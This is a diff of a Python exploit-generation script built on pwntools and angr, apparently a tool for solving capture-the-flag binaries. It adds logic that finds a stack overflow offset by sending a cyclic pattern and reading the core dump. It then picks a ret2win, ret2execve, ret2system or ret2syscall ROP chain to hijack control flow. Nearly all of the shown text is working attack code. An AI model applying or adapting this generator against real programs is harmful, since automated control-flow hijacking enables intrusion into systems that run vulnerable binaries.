@@ -1,19 +1,49 @@
 from pwn import *
-import angr, claripy
+import angr
+import claripy
 import subprocess
+import os
 
 class ROP:
-    def __init__(self, analysis, properties):
+    def __init__(self, analysis):
         self.analysis = analysis
         self.filename = analysis.binary
-        self.properties = properties
-        self.offset = Get2overflow(self.filename).buf()
+        self.offset = self.set_offset()
         self.e = ELF(self.filename)
         self.gadgets = []
+    
+    def build_exploit(self):
+        payload = None
+        if self.analysis.has_win():
+            if self.analysis.win_has_args():
+                payload = self.ret2win_with_args()
+            else:
+                payload = self.ret2win()
+        elif self.analysis.has_execve():
+            payload = self.ret2execve()
+        elif self.analysis.has_system():
+            payload = self.ret2system()
+        elif self.analysis.has_syscall():
+            payload = self.ret2syscall()
+
+        return payload
+    
+    def set_offset(self):
+        try:
+            p = process(self.filename)
+            p.sendline(cyclic(1024, n=8))
+            p.wait()
+            core = p.corefile
+            p.close()
+            os.remove(core.file.name)
+            return cyclic_find(core.read(core.rsp, 8), n=8)
+        except PwnlibException as e:
+            return Get2overflow(self.filename).buf()
 
     def ret2win(self):
         payload = cyclic(self.offset)
         payload += p64(self.e.sym["win"])
+        
         return payload
 
     def ret2execve(self):
@@ -91,7 +121,7 @@ class ROP:
         return p64(self.analyze.get_fini())
 
     def satisfy_win(self):
-        return self.fill_reg("rdi", self.analyze.get_win_arg())
+        return self.fill_reg("rdi", int(self.analyze.get_win_arg(), 16))
 
 class Get2overflow:
     def __init__(s, binary):
